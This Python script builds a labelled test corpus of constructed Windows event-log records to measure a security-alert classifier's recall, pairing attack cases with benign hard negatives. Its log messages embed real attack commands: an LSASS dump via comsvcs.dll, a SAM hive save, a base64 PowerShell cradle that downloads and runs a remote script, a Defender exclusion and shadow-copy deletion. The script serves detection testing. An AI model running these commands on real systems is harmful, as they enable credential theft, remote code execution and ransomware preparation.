#!/usr/bin/env python3
"""Construct labelled positive cases so recall can be measured at all.

    python scripts/build_attack_corpus.py
    python scripts/run_eval.py --corpus evals/corpus_attacks.jsonl

Why this exists
---------------
`evals/corpus.jsonl` is real telemetry from this deployment, and every one of
its ten cases is NOT_CRITICAL, because the machine was not under attack while
it was collected. A corpus with no positives can measure precision and cannot
measure recall: it says whether the model over-escalates, and says nothing
about whether it misses an intrusion. Missing an intrusion is the failure that
matters.

What these cases are, and are not
---------------------------------
The **envelope is real**: the same JSON shape log_extractor produces, the same
` | ` field joining, the same Windows channel/provider `source` strings, taken
from the observed corpus. Format quirks are what synthetic corpora usually get
wrong, and they are the thing this pipeline has already been bitten by.

The **content is constructed** from documented technique behaviour. Nobody ran
mimikatz on this machine.

That asymmetry decides how to read a result:

- **A miss is real evidence.** If the model cannot flag a textbook LSASS dump
  written in this deployment's own log format, it will not flag a subtle one.
- **A hit is weak evidence.** These are the loud versions. A real intruder is
  quieter, and catching the loud case says little about the quiet one.

So treat recall here as an **upper bound**: the model will not do better than
this against a real adversary. Watching it fall is meaningful; a high number
is not a safety claim.

The hard negatives are the other half. Administrators legitimately run
PowerShell, clear logs, create accounts and connect over SMB, and a model that
escalates all of that is useless in a different way. Those cases are labelled
NOT_CRITICAL and are the ones most likely to be got wrong.
"""

from __future__ import annotations

import argparse
import json
import pathlib
import sys

ROOT = pathlib.Path(__file__).resolve().parent.parent
OUT = ROOT / "evals" / "corpus_attacks.jsonl"


def event(source: str, severity: str, event_type: str, message: str,
          when: str = "2026-08-23 03:14:07") -> dict:
    """The envelope log_extractor produces, copied from the observed corpus."""
    return {
        "timestamp": when,
        "datetime": when,
        "source": source,
        "severity": severity,
        "event_type": event_type,
        "message": message,
    }


SEC = "Security/Microsoft-Windows-Security-Auditing"
PS = "Windows PowerShell/PowerShell"
SYS = "System/Service Control Manager"
SYSMON = "Microsoft-Windows-Sysmon/Operational"


# (id, expected, note, event)
CASES = [
    # ---- credential access -------------------------------------------------
    ("t1003-lsass-dump", "CRITICAL",
     "T1003.001 LSASS memory dump via comsvcs. The canonical living-off-the-land "
     "credential dump; if this is missed nothing subtler will be caught.",
     event(SEC, "HIGH", "PRIVILEGE_ESCALATION",
           "[Security] EID=4688, Cat=13312 | New Process | "
           "Account=CORP\\svc_backup | "
           "CommandLine=rundll32.exe C:\\Windows\\System32\\comsvcs.dll, "
           "MiniDump 704 C:\\Windows\\Temp\\lsass.dmp full | "
           "ParentImage=C:\\Windows\\System32\\cmd.exe")),

    ("t1003-reg-save-sam", "CRITICAL",
     "T1003.002 SAM and SYSTEM hives copied out for offline cracking.",
     event(SEC, "HIGH", "PRIVILEGE_ESCALATION",
           "[Security] EID=4688, Cat=13312 | New Process | Account=CORP\\admin | "
           "CommandLine=reg.exe save HKLM\\SAM C:\\Users\\Public\\sam.hive")),

    # ---- execution ---------------------------------------------------------
    ("t1059-encoded-download-cradle", "CRITICAL",
     "T1059.001 hidden, no-profile PowerShell with a base64 download cradle. "
     "Every part of this is an indicator on its own.",
     event(PS, "CRITICAL", "MALWARE_INDICATORS",
           "[PowerShell] EID=4104, Cat=2 | ScriptBlock | "
           "powershell.exe -nop -w hidden -enc "
           "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABp"
           "AGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAA"
           "OgAvAC8AMQA5ADUALgAyADAAMgAuADEAMQAuADQAOAAvAGEALgBwAHMAMQAnACkA")),

    # ---- persistence -------------------------------------------------------
    ("t1053-scheduled-task-payload", "CRITICAL",
     "T1053.005 SYSTEM scheduled task running a payload out of a world-writable "
     "directory at logon.",
     event(SEC, "HIGH", "SYSTEM_SECURITY",
           "[Security] EID=4698, Cat=12804 | A scheduled task was created | "
           "Account=CORP\\svc_backup | TaskName=\\Microsoft\\Windows\\UpdateSync | "
           "Command=C:\\Users\\Public\\svchost.exe | RunAs=SYSTEM | Trigger=AtLogon")),

    ("t1547-run-key", "SUSPICIOUS",
     "T1547.001 Run key pointing at AppData. Common for malware and for badly "
     "packaged legitimate software, which is why this is SUSPICIOUS not CRITICAL.",
     event(SYSMON, "MEDIUM", "SYSTEM_SECURITY",
           "[Sysmon] EID=13, Cat=0 | Registry value set | "
           "TargetObject=HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater | "
           "Details=C:\\Users\\jdoe\\AppData\\Roaming\\updater.exe")),

    # ---- defence evasion ---------------------------------------------------
    ("t1070-clear-security-log", "CRITICAL",
     "T1070.001 the Security log itself was cleared. Destroys the evidence of "
     "whatever came before it.",
     event(SEC, "HIGH", "SYSTEM_SECURITY",
           "[Security] EID=1102, Cat=104 | The audit log was cleared | "
           "Account=CORP\\svc_backup | LogonId=0x3e7")),

    ("t1562-defender-exclusion", "CRITICAL",
     "T1562.001 attacker excludes the directory they are about to write to.",
     event(PS, "HIGH", "SECURITY_TOOLS",
           "[PowerShell] EID=4104, Cat=2 | ScriptBlock | "
           "Add-MpPreference -ExclusionPath C:\\Users\\Public")),

    # ---- lateral movement --------------------------------------------------
    ("t1021-psexec-service", "CRITICAL",
     "T1021.002 remote service created from a randomly named binary in ADMIN$. "
     "The PsExec pattern.",
     event(SYS, "HIGH", "WINDOWS_SECURITY",
           "[System] EID=7045, Cat=0 | A service was installed | "
           "ServiceName=mtHKzQrx | "
           "ImagePath=\\\\10.20.30.41\\ADMIN$\\mtHKzQrx.exe | "
           "ServiceType=user mode service | StartType=demand start")),

    ("t1110-password-spray", "SUSPICIOUS",
     "T1110.003 the same wrong password against many accounts from one host. "
     "Any single 4625 is routine; the shape across accounts is the signal.",
     event(SEC, "MEDIUM", "BRUTE_FORCE",
           "[Security] EID=4625, Cat=12544 | An account failed to log on | "
           "Accounts=jdoe,asmith,rpatel,mchen,klopez (5 distinct in 40s) | "
           "Status=0xC000006A | WorkstationName=WKSTN-14 | "
           "IpAddress=10.20.30.41 | LogonType=3")),

    # ---- impact ------------------------------------------------------------
    ("t1490-shadow-copy-delete", "CRITICAL",
     "T1490 shadow copies deleted. Near-universal immediately before ransomware "
     "encryption; there is almost no benign reason to run this.",
     event(SEC, "HIGH", "MALWARE_INDICATORS",
           "[Security] EID=4688, Cat=13312 | New Process | Account=CORP\\admin | "
           "CommandLine=vssadmin.exe delete shadows /all /quiet | "
           "ParentImage=C:\\Users\\Public\\svchost.exe")),

    # ---- hard negatives ----------------------------------------------------
    # These look like the cases above and are not attacks. A model that
    # escalates them is unusable for a different reason, and they are the ones
    # most likely to be got wrong.
    ("benign-sccm-powershell", "NOT_CRITICAL",
     "Hard negative. Hidden, no-profile PowerShell - but it is the management "
     "agent running a signed inventory script from Program Files.",
     event(PS, "MEDIUM", "MALWARE_INDICATORS",
           "[PowerShell] EID=4104, Cat=2 | ScriptBlock | "
           "powershell.exe -nop -w hidden -File "
           "\"C:\\Program Files\\Microsoft\\ConfigurationManager\\Scripts\\Inventory.ps1\" | "
           "ParentImage=C:\\Windows\\CCM\\CcmExec.exe")),

    ("benign-admin-service-install", "NOT_CRITICAL",
     "Hard negative. A service installed from a remote share, like the PsExec "
     "case - but a named vendor binary from the software distribution point.",
     event(SYS, "MEDIUM", "WINDOWS_SECURITY",
           "[System] EID=7045, Cat=0 | A service was installed | "
           "ServiceName=NinjaRMMAgent | "
           "ImagePath=\\\\corp-sccm01\\SoftwareDist$\\NinjaRMMAgent.exe | "
           "StartType=auto start")),

    ("benign-log-rotation", "NOT_CRITICAL",
     "Hard negative. A log was cleared - the Application log, by the archiving "
     "task, on schedule. Not the Security log, and not by a service account "
     "that has no business doing it.",
     event("Application/Microsoft-Windows-Eventlog", "LOW", "SYSTEM_SECURITY",
           "[Application] EID=104, Cat=104 | The Application log file was cleared | "
           "Account=NT AUTHORITY\\SYSTEM | "
           "Process=C:\\Windows\\System32\\wevtutil.exe archive-log")),

    ("benign-backup-smb", "NOT_CRITICAL",
     "Hard negative. Network logon to a file share by the backup service at its "
     "scheduled time, from the backup server.",
     event(SEC, "MEDIUM", "WINDOWS_SECURITY",
           "[Security] EID=4624, Cat=12544 | An account was successfully logged on | "
           "Account=CORP\\svc_backup | LogonType=3 | "
           "WorkstationName=CORP-BKP01 | IpAddress=10.20.30.9 | "
           "AuthenticationPackage=Kerberos")),

    ("benign-developer-encoded", "NOT_CRITICAL",
     "Hard negative. Base64 in a command line, from a developer's own terminal, "
     "decoding a config file. Encoding is not an indicator by itself.",
     event(PS, "MEDIUM", "MALWARE_INDICATORS",
           "[PowerShell] EID=4104, Cat=2 | ScriptBlock | "
           "[Convert]::FromBase64String($env:APP_CONFIG) | "
           "ParentImage=C:\\Program Files\\Microsoft VS Code\\Code.exe")),
]


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--out", default=str(OUT))
    args = ap.parse_args()

    out = pathlib.Path(args.out)
    out.parent.mkdir(parents=True, exist_ok=True)

    with out.open("w", encoding="utf-8") as fh:
        for case_id, expected, note, ev in CASES:
            fh.write(json.dumps({
                "id": f"constructed:{case_id}",
                "table": "siem_events",
                "event": {
                    "id": None,
                    "source": ev["source"],
                    "severity": ev["severity"],
                    "timestamp": ev["timestamp"],
                    "message": json.dumps(ev, ensure_ascii=False),
                },
                "expected": expected,
                "note": note,
                "recorded_severity": ev["severity"],
                "below_floor": False,
                # Never let a run mix these with observed telemetry unnoticed.
                "constructed": True,
            }, ensure_ascii=False) + "\n")

    positives = sum(1 for _, e, _, _ in CASES if e in ("CRITICAL", "SUSPICIOUS"))
    print(f"[+] {len(CASES)} constructed case(s) -> {out}")
    print(f"    {positives} positive, {len(CASES) - positives} hard negative")
    print()
    print("    These are CONSTRUCTED, not observed. A miss is real evidence;")
    print("    a hit is weak evidence, because these are the loud versions of")
    print("    each technique. Read recall here as an upper bound.")
    print()
    print(f"    python scripts/run_eval.py --corpus {out}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
